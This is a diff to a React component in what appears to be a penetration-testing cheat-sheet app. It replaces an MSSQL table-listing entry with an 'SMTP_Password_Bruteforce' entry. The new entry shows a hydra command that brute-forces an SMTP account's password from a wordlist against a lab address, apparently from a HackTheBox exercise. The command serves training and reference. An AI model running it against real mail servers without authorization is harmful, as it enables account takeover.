@@ -15,7 +15,7 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
     title: string;
   }
   
-  const MSSQL_List_Tables = ({ title }: IProps) => {
+  const SMTP_Password_Bruteforce = ({ title }: IProps) => {
 
     return (
       <>
@@ -40,16 +40,16 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
               <Typography variant="h6">
                     Description
                 </Typography>
-
-
               <Typography>
-              To list tables in MSSQL.
+              There are multiple tools that can be used to attack user's passwords of an SMTP server.
                </Typography>
-               <Box pt={5} />
-              <SyntaxHighlighter className="syntax" language="ftp">
-              {"select table_name from {DB_NAME}.INFORMATION_SCHEMA.TABLES;"}
+               <Box pt={5}/>
+               <Typography>
+               hydra
+               </Typography>
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"hydra -l 'marlin@inlanefreight.htb' -P pws.list 10.129.68.69 smtp"}
             </SyntaxHighlighter>
-            
             </Typography>
           </AccordionDetails>
         </Accordion>
@@ -58,5 +58,5 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
   };
 
   
-  export default MSSQL_List_Tables;
+  export default SMTP_Password_Bruteforce;
   
